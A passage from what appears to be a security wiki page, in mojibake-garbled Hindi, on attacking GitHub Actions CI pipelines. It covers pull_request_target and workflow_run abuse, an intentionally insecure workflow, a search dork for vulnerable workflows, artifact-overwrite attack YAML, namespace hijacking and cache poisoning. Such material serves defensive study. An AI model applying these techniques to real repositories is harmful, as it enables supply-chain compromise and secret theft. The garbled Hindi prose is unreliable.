рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдЯреНрд░рд┐рдЧрд░ **`pull_request_target`** **рдмреЗрд╕ рд╕рдВрджрд░реНрдн** рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ рди рдХрд┐ PR рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рд╕рдВрджрд░реНрдн рдореЗрдВ (рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХреЛрдб рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рди рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП)ред `pull_request_target` рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рджреЗрдЦреЗрдВ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрд╕ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЦрддрд░рдирд╛рдХ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ [**github рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) рдХреЛ рджреЗрдЦреЗрдВред

рдРрд╕рд╛ рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпреЛрдВрдХрд┐ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рд╡рд╣ рд╣реИ рдЬреЛ **рдмреЗрд╕** рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИ рдФрд░ **PR рдореЗрдВ рдирд╣реАрдВ** рд╣реИ, **`pull_request_target`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ **рд╕реБрд░рдХреНрд╖рд┐рдд** рд╣реИ, рд▓реЗрдХрд┐рди рдХреБрдЫ **рдорд╛рдорд▓реЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рдпрд╣ рдирд╣реАрдВ рд╣реИ**ред

рдФрд░ рдЗрд╕ рдПрдХ рдХреЗ рдкрд╛рд╕ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ** рд╣реЛрдЧреАред

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) рдЯреНрд░рд┐рдЧрд░ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдПрдХ рдЕрд▓рдЧ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрдм рдпрд╣ `completed`, `requested` рдпрд╛ `in_progress` рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдЕрд▓рдЧ "Run Tests" рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдпрд╣ **workflow** рдкрд░ рдирд┐рд░реНрднрд░ рд╣реИ рдЬрд┐рд╕реЗ рдмрд╛рд╣рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ **`pull_request`** рдпрд╛ **`pull_request_target`** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **triggered** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреБрдЫ рдХрдордЬреЛрд░ рдЙрджрд╛рд╣рд░рдг [**рдЗрд╕ рдмреНрд▓реЙрдЧ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) рдореЗрдВ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг **`workflow_run`** рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдХреЛрдб рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИ: `${{ github.event.pull_request.head.sha }}`\
рджреВрд╕рд░рд╛ рдЙрджрд╛рд╣рд░рдг **untrusted** рдХреЛрдб рд╕реЗ **artifact** рдХреЛ **`workflow_run`** рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ рдкрд╛рд╕ рдХрд░рдиреЗ рдФрд░ рдЗрд╕ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдпрд╣ **RCE рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░** рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

### `workflow_call`

TODO

TODO: Check if when executed from a pull\_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

рд╣рдордиреЗ рдЙрди рд╕рднреА рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рдирд╕реЗ рдПрдХ рдмрд╛рд╣рд░реА рд╣рдорд▓рд╛рд╡рд░ рдПрдХ github рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЕрдм рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЗрди рдирд┐рд╖реНрдкрд╛рджрдиреЛрдВ рдХрд╛, рдпрджрд┐ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рддреЛ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

### Untrusted checkout execution

**`pull_request`** рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **PR рдХреЗ рд╕рдВрджрд░реНрдн** рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЗрд╕рд▓рд┐рдП рдпрд╣ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг PRs рдХреЛрдб** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛), рд▓реЗрдХрд┐рди рдХрд┐рд╕реА рдХреЛ рдЗрд╕реЗ **рдкрд╣рд▓реЗ рдЕрдзрд┐рдХреГрдд** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдпрд╣ рдХреБрдЫ [рд╕реАрдорд╛рдУрдВ](./#pull\_request) рдХреЗ рд╕рд╛рде рдЪрд▓реЗрдЧрд╛ред

**`pull_request_target` рдпрд╛ `workflow_run`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдЬреЛ **`pull_request_target` рдпрд╛ `pull_request`** рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ, рдореВрд▓ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП **рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛**ред

{% hint style="danger" %}
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ **action** рдореЗрдВ рдПрдХ **explicit PR checkout** рд╣реИ рдЬреЛ **PR рд╕реЗ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛** (рдФрд░ рдмреЗрд╕ рд╕реЗ рдирд╣реАрдВ), рддреЛ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП (рд▓рд╛рдЗрди 12 рджреЗрдЦреЗрдВ рдЬрд╣рд╛рдВ PR рдХреЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

рд╕рдВрднрд╛рд╡рд┐рдд **untrusted code `npm install` рдпрд╛ `npm build` рдХреЗ рджреМрд░рд╛рди рдЪрд▓ рд░рд╣рд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдмрд┐рд▓реНрдб рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдФрд░ рд╕рдВрджрд░реНрднрд┐рдд **рдкреИрдХреЗрдЬ PR рдХреЗ рд▓реЗрдЦрдХ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдХрдордЬреЛрд░ actions рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП рдПрдХ github dork рд╣реИ: `event.pull_request pull_request_target extension:yml` рд╣рд╛рд▓рд╛рдВрдХрд┐, рдиреМрдХрд░рд┐рдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ, рднрд▓реЗ рд╣реА action рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ (рдЬреИрд╕реЗ рдХрд┐ PR рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ actor рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╢рд░реНрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛)ред
{% endhint %}

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) рд╣реИрдВ рдЬрд┐рдирдХреЗ рдорд╛рди **PR рдмрдирд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд** рд╣реЛрддреЗ рд╣реИрдВред рдпрджрд┐ github action рдЙрд╕ **рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреБрдЫ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдпрд╣ **arbitrary code execution** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

рдбреЙрдХреНрд╕ рд╕реЗ: рдЖрдк рдХрд┐рд╕реА рднреА рдмрд╛рдж рдХреЗ рдЪрд░рдгреЛрдВ рдореЗрдВ рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдЬреЙрдм рдореЗрдВ рдПрдХ environment variable рдЙрдкрд▓рдмреНрдз рдХрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ **`GITHUB_ENV`** environment file рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ **env** variable рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рднреА рдорд╛рди **inject** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ env variables inject рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЕрдЧрд▓реЗ рдЪрд░рдгреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ **LD\_PRELOAD** рдпрд╛ **NODE\_OPTIONS**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ([**рдпрд╣**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) рдФрд░ [**рдпрд╣**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), рдПрдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреА рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ рдЬреЛ рдПрдХ рдЕрдкрд▓реЛрдб рдХрд┐рдП рдЧрдП рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░ рд░рд╣рд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ **`GITHUB_ENV`** env variable рдХреЗ рдЕрдВрджрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрд╣ Github Action рд╡рд┐рднрд┐рдиреНрди рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реАрдЬрд╝ рд╕реЗ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рд╕рдорд╕реНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ **`path`** рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдмрд╛рдж рдореЗрдВ рдЙрдкрдпреЛрдЧ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдХрдордЬреЛрд░ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреЗ рд╣реИрдВред

рдХрдордЬреЛрд░ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
рдпрд╣ рдЗрд╕ workflow рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## рдЕрдиреНрдп рдмрд╛рд╣рд░реА рдПрдХреНрд╕реЗрд╕

### рдбрд┐рд▓реАрдЯреЗрдб рдиреЗрдорд╕реНрдкреЗрд╕ рд░рд┐рдкреЛ рд╣рд╛рдИрдЬреИрдХрд┐рдВрдЧ

рдпрджрд┐ рдПрдХ рдЦрд╛рддрд╛ рдЕрдкрдирд╛ рдирд╛рдо рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рд╕рдордп рдмрд╛рдж рдХреЛрдИ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрд╕ рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рдЦрд╛рддрд╛ рдкрдВрдЬреАрдХреГрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдХрд┐рд╕реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рдирд╛рдо рдмрджрд▓рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **100 рд╕реЗ рдХрдо рд╕реНрдЯрд╛рд░реНрд╕** рдереЗ, рддреЛ Github рдирдП рдкрдВрдЬреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЙрд╕реА рдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдЬреИрд╕рд╛ рдХрд┐ рдбрд┐рд▓реАрдЯреЗрдб рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХрд╛ рдирд╛рдо рдерд╛ред

{% hint style="danger" %}
рддреЛ рдпрджрд┐ рдХреЛрдИ рдПрдХреНрд╢рди рдХрд┐рд╕реА рдЧреИрд░-рдореМрдЬреВрдж рдЦрд╛рддреЗ рд╕реЗ рд░рд┐рдкреЛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрднреА рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛ рд╕рдХреЗ рдФрд░ рдПрдХреНрд╢рди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХреЗред
{% endhint %}

рдпрджрд┐ рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА **рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░рд┐рдкреЛ рд╕реЗ рдирд┐рд░реНрднрд░рддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рдереЗ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рд╣рд╛рдИрдЬреИрдХ рдХрд░ рд╕рдХреЗрдЧрд╛ред рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдЕрдзрд┐рдХ рдкреВрд░реНрдг рд╡реНрдпрд╛рдЦреНрдпрд╛ рд╣реИ: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## рд░рд┐рдкреЛ рдкрд┐рд╡реЛрдЯрд┐рдВрдЧ

{% hint style="info" %}
рдЗрд╕ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╣рдо рдЙрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдд рдХрд░реЗрдВрдЧреЗ рдЬреЛ **рдПрдХ рд░рд┐рдкреЛ рд╕реЗ рджреВрд╕рд░реЗ рд░рд┐рдкреЛ рдореЗрдВ рдкрд┐рд╡реЛрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ, рдпрд╣ рдорд╛рдирддреЗ рд╣реБрдП рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдкрд░ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ (рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ)ред
{% endhint %}

### рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

рдПрдХ рдХреИрд╢ **рдЙрд╕реА рд╢рд╛рдЦрд╛ рдореЗрдВ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рд░рди рдХреЗ рдмреАрдЪ** рдмрдирд╛рдП рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдкреИрдХреЗрдЬ** рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдлрд┐рд░ рдХреИрд╢ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ **рдбрд╛рдЙрдирд▓реЛрдб** рдФрд░ **рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд** рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рднреА рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХреЗрдЧрд╛ред

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд░рд┐рдкреЛ рд╕реЗ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯреНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЧрд┐рдЯрд╣рдм рдПрдХреНрд╢рди** рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **рдПрдХ рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдЕрдкрд▓реЛрдб рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдмрд╛рдж рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **рдЕрдиреНрдп рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рд╕рдордЭреМрддрд╛** рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## рдПрдХреНрд╢рди рд╕реЗ рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### OIDC рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ AWS рдФрд░ GCP рддрдХ рдкрд╣реБрдВрдЪ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрдареЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

